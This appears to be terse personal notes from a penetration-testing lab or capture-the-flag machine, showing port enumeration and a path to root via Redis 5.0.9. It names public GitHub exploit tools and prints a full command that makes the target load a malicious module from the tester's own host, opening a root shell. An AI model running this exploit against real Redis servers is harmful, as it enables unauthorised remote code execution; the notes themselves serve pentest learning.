ports 22 ssh, 53 dns, 80 web ngix default, 8080 nodeBB
nodeBB searchsploit shows 3 exploits, 
48875.txt - account takeover idor
after a lot of wasted time in the two web ports, we do a deep nmap scan

hidden ports reveal 6379 redis, 27017 mongoDB

nothing on mongoDB

but redis is one juicy ting
There are exploits on exploitDB with metasploit

So I lookup exploits for redis 5.0.9 rce
https://github.com/Ridter/redis-rce/
has an redis-rce.py, which takes a exp.so file as input, which we need to have on our local machine

Another github exploit, https://github.com/n0b0dyCN/redis-rogue-server has this exp.so
So we clone it and try to run it with redis-rogue-server.py itself, but it doesnt work
`[err ] UnicodeDecodeError('gb18030', b'$1\r\n\x83\r\n', 4, 5, 'illegal multibyte sequence')`

So we use the exp.so from redis-rogue-server and run the redis-rce exploit from the first github repo, and we get a root shell into the machine
`python redis-rce.py -r 192.168.233.69 -p 6379 -L 192.168.45.168 -P 80 -f redis-rogue-server/exp.so`
root!

---
---
---
Actually, the first repo (redis-rogue-server worked as well), was probably getting the error due to something that was left from another try earlier